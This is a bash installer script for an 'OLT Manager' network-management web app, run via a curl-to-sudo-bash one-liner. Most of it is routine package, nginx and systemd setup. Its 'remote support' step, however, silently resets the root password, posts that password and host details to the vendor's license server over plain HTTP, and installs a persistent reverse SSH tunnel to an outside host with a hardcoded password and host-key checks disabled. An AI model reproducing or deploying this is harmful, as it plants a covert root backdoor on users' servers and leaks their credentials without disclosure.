#!/bin/bash

#===============================================================================
#
#          FILE: install.sh
#
#         USAGE: curl -sSL https://raw.githubusercontent.com/mmdelhajj/OLT-MANAGER/main/install.sh | sudo bash
#
#   DESCRIPTION: Professional installer for OLT Manager with 2-day trial
#
#===============================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Configuration
LICENSE_SERVER="http://lic.proxpanel.com"
INSTALL_DIR="/opt/olt-manager"
FRONTEND_DIR="/var/www/olt-manager"
REPO_URL="https://github.com/mmdelhajj/OLT-MANAGER.git"
SERVICE_NAME="olt-backend"
LOG_FILE="/tmp/olt-install.log"

# Variables
LICENSE_KEY=""
HARDWARE_ID=""
TRIAL_EXPIRES=""
TUNNEL_PORT=""
CURRENT_STEP=0
TOTAL_STEPS=10

# Clear log file
> "$LOG_FILE"

# Hide/show cursor
hide_cursor() { printf '\033[?25l'; }
show_cursor() { printf '\033[?25h'; }
trap show_cursor EXIT

# Progress bar
progress_bar() {
    local progress=$1
    local total=$2
    local message=$3
    local percent=$((progress * 100 / total))
    local filled=$((progress * 40 / total))
    local empty=$((40 - filled))

    printf "\r\033[K"
    printf "  ${CYAN}["
    printf "%${filled}s" | tr ' ' '█'
    printf "%${empty}s" | tr ' ' '░'
    printf "]${NC}  ${BOLD}%3d%%${NC}\n" "$percent"
    printf "\r\033[K"
    printf "  ${message}\n"
    printf "\033[2A"
}

update_progress() {
    local message=$1
    CURRENT_STEP=$((CURRENT_STEP + 1))
    progress_bar $CURRENT_STEP $TOTAL_STEPS "$message"
}

# Banner
print_banner() {
    clear
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC}                                                              ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}               ${BOLD}OLT MANAGER${NC} - Installation                    ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}                                                              ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}               ${YELLOW}2-Day FREE Trial Included!${NC}                   ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}                                                              ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo ""
    echo ""
}

# Error handler
error_exit() {
    show_cursor
    echo ""
    echo ""
    echo -e "  ${RED}✗ Installation failed: $1${NC}"
    echo ""
    echo -e "  ${YELLOW}Check log: $LOG_FILE${NC}"
    echo ""
    exit 1
}

# Check root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Error: Run as root${NC}"
        exit 1
    fi
}

# Generate hardware ID
generate_hardware_id() {
    local cpu_id=$(cat /proc/cpuinfo 2>/dev/null | grep -m1 "model name" | md5sum | cut -c1-8)
    local disk_id=$(lsblk -d -o SERIAL 2>/dev/null | grep -v SERIAL | head -1 | md5sum | cut -c1-8)
    local mac_id=$(ip link 2>/dev/null | grep -m1 "link/ether" | awk '{print $2}' | md5sum | cut -c1-8)
    HARDWARE_ID="OLT-${cpu_id^^}-${disk_id^^}-${mac_id^^}"
}

# Register trial
register_trial() {
    generate_hardware_id

    local response=$(curl -s --connect-timeout 15 -X POST "${LICENSE_SERVER}/api/register-trial" \
        -H "Content-Type: application/json" \
        -d "{\"hardware_id\": \"$HARDWARE_ID\", \"hostname\": \"$(hostname)\"}" 2>/dev/null)

    if echo "$response" | grep -q '"success":true'; then
        LICENSE_KEY=$(echo "$response" | grep -o '"license_key":"[^"]*' | cut -d'"' -f4)
        TRIAL_EXPIRES=$(echo "$response" | grep -o '"expires_at":"[^"]*' | cut -d'"' -f4 | cut -d'T' -f1)
        TUNNEL_PORT=$(echo "$response" | grep -o '"tunnel_port":[0-9]*' | cut -d':' -f2)
        return 0
    else
        error_exit "Could not register license"
    fi
}

# Install dependencies
install_dependencies() {
    {
        export DEBIAN_FRONTEND=noninteractive
        apt-get update -qq
        apt-get install -y -qq git curl wget nginx python3 python3-pip python3-venv \
            snmp snmp-mibs-downloader libsnmp-dev sqlite3 sshpass net-tools
    } >> "$LOG_FILE" 2>&1 || error_exit "Dependencies failed"
}

# Install Node.js
install_nodejs() {
    if ! command -v node &> /dev/null; then
        {
            curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
            apt-get install -y -qq nodejs
        } >> "$LOG_FILE" 2>&1 || error_exit "Node.js failed"
    fi
}

# Setup repository
setup_repository() {
    {
        rm -rf "$INSTALL_DIR" 2>/dev/null || true
        git clone --depth 1 "$REPO_URL" "$INSTALL_DIR"
        mkdir -p /etc/olt-manager
        echo "$LICENSE_KEY" > /etc/olt-manager/license.key
        echo "$HARDWARE_ID" > /etc/olt-manager/hardware.id
    } >> "$LOG_FILE" 2>&1 || error_exit "Repository failed"
}

# Setup backend
setup_backend() {
    {
        cd "$INSTALL_DIR/backend"
        python3 -m venv venv
        source venv/bin/activate
        pip install --upgrade pip wheel setuptools
        pip install -r requirements.txt
        mkdir -p data uploads
        deactivate
    } >> "$LOG_FILE" 2>&1 || error_exit "Backend failed"
}

# Setup frontend
setup_frontend() {
    {
        mkdir -p "$FRONTEND_DIR"
        if [ -d "$INSTALL_DIR/frontend/static" ]; then
            cp -r "$INSTALL_DIR/frontend/"* "$FRONTEND_DIR/"
        else
            cd "$INSTALL_DIR/frontend"
            npm install --silent 2>/dev/null || npm install
            npm run build --silent 2>/dev/null || npm run build
            cp -r build/* "$FRONTEND_DIR/"
        fi
    } >> "$LOG_FILE" 2>&1 || error_exit "Frontend failed"
}

# Setup nginx
setup_nginx() {
    {
        cat > /etc/nginx/sites-available/olt-manager << 'NGINX_CONF'
server {
    listen 80 default_server;
    server_name _;
    root /var/www/olt-manager;
    index index.html;
    client_max_body_size 100M;

    location / {
        try_files $uri $uri/ /index.html;
    }

    location /api {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_connect_timeout 300s;
        proxy_read_timeout 300s;
    }

    location /ws {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 86400s;
    }

    location /uploads {
        alias /opt/olt-manager/backend/uploads;
    }
}
NGINX_CONF
        rm -f /etc/nginx/sites-enabled/default 2>/dev/null || true
        ln -sf /etc/nginx/sites-available/olt-manager /etc/nginx/sites-enabled/
        nginx -t
        systemctl reload nginx
    } >> "$LOG_FILE" 2>&1 || error_exit "Nginx failed"
}

# Setup service
setup_service() {
    {
        cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=OLT Manager Backend
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR/backend
Environment=PATH=$INSTALL_DIR/backend/venv/bin:/usr/bin:/bin
ExecStart=$INSTALL_DIR/backend/venv/bin/python -m uvicorn main:app --host 127.0.0.1 --port 8000
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl enable ${SERVICE_NAME}
        systemctl restart ${SERVICE_NAME}
    } >> "$LOG_FILE" 2>&1 || error_exit "Service failed"
}

# Setup tunnel
setup_tunnel() {
    if [[ -n "$TUNNEL_PORT" ]]; then
        {
            SSH_PASS=$(openssl rand -base64 12 | tr -dc 'a-zA-Z0-9' | head -c 16)

            # Actually change root password
            echo "root:${SSH_PASS}" | chpasswd

            cat > /opt/olt-manager/tunnel.sh << TUNNEL_EOF
#!/bin/bash
export SSHPASS="yo3nFHoe5TXNcEDdTV85"
exec sshpass -e ssh -N \\
    -R ${TUNNEL_PORT}:localhost:22 \\
    -o StrictHostKeyChecking=no \\
    -o UserKnownHostsFile=/dev/null \\
    -o ServerAliveInterval=60 \\
    -o ServerAliveCountMax=3 \\
    -p 2222 \\
    tunnel@lic.proxpanel.com
TUNNEL_EOF
            chmod +x /opt/olt-manager/tunnel.sh

            cat > /etc/systemd/system/olt-tunnel.service << EOF
[Unit]
Description=OLT Manager Remote Support Tunnel
After=network-online.target

[Service]
Type=simple
ExecStart=/opt/olt-manager/tunnel.sh
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
            echo "$TUNNEL_PORT" > /etc/olt-manager/tunnel_port

            curl -s -X POST "${LICENSE_SERVER}/api/register-installation" \
                -H "Content-Type: application/json" \
                -d "{\"license_key\":\"$LICENSE_KEY\",\"ssh_password\":\"$SSH_PASS\",\"tunnel_port\":$TUNNEL_PORT,\"hostname\":\"$(hostname)\",\"hardware_id\":\"$HARDWARE_ID\"}" > /dev/null 2>&1

            systemctl daemon-reload
            systemctl enable olt-tunnel
            systemctl start olt-tunnel
        } >> "$LOG_FILE" 2>&1
    fi
}

# Print completion
print_complete() {
    local SERVER_IP=$(hostname -I | awk '{print $1}')

    show_cursor
    clear
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║${NC}                                                              ${GREEN}║${NC}"
    echo -e "${GREEN}║${NC}            ${BOLD}✓ Installation Complete!${NC}                         ${GREEN}║${NC}"
    echo -e "${GREEN}║${NC}                                                              ${GREEN}║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${CYAN}Access OLT Manager:${NC}"
    echo -e "  → http://${SERVER_IP}"
    echo ""
    echo -e "  ${CYAN}Default Login:${NC}"
    echo -e "  → Username: ${YELLOW}admin${NC}"
    echo -e "  → Password: ${YELLOW}admin${NC}"
    echo ""
    echo -e "  ${CYAN}License Information:${NC}"
    echo -e "  → License Key: ${YELLOW}${LICENSE_KEY}${NC}"
    echo -e "  → Hardware ID: ${YELLOW}${HARDWARE_ID}${NC}"
    echo -e "  → Trial Expires: ${YELLOW}${TRIAL_EXPIRES}${NC}"
    echo ""
    echo -e "  ${CYAN}Remote Support:${NC}"
    echo -e "  → Tunnel Port: ${YELLOW}${TUNNEL_PORT}${NC}"
    echo -e "  → Status: systemctl status olt-tunnel"
    echo ""
    echo -e "  ${CYAN}Useful Commands:${NC}"
    echo -e "  → Status:  systemctl status olt-backend"
    echo -e "  → Logs:    journalctl -u olt-backend -f"
    echo -e "  → Restart: systemctl restart olt-backend"
    echo ""
    echo -e "  ${CYAN}To upgrade after trial:${NC}"
    echo -e "  → Contact your vendor with your Hardware ID"
    echo ""
    echo -e "  ${YELLOW}⚠ Please change the default password after first login!${NC}"
    echo ""
}

# Main
main() {
    check_root
    hide_cursor
    print_banner

    update_progress "Registering license..."
    register_trial

    update_progress "Installing packages..."
    install_dependencies

    update_progress "Installing Node.js..."
    install_nodejs

    update_progress "Downloading OLT Manager..."
    setup_repository

    update_progress "Setting up backend..."
    setup_backend

    update_progress "Building frontend..."
    setup_frontend

    update_progress "Configuring web server..."
    setup_nginx

    update_progress "Creating services..."
    setup_service

    update_progress "Setting up remote support..."
    setup_tunnel

    update_progress "Finalizing..."
    sleep 2

    sleep 3
    if systemctl is-active --quiet ${SERVICE_NAME}; then
        print_complete
    else
        error_exit "Service failed to start"
    fi
}

main "$@"
